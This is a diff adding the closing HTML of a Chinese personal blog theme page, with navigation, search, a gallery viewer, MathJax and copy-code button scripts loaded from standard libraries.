+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories/%E6%97%85%E8%A1%8C">旅行</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories/%E7%BE%8E%E9%A3%9F">美食</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories/%E6%91%84%E5%BD%B1">摄影</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+ <script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+  var ayerConfig = {
+    mathjax: true,
+  };
+</script>
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+ 
+<script src="/js/clickBoom2.js"></script>
+ 
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "neutral" });
+  }
+</script>
+
+
+    
+  </div>
+</body>
+
+</html>
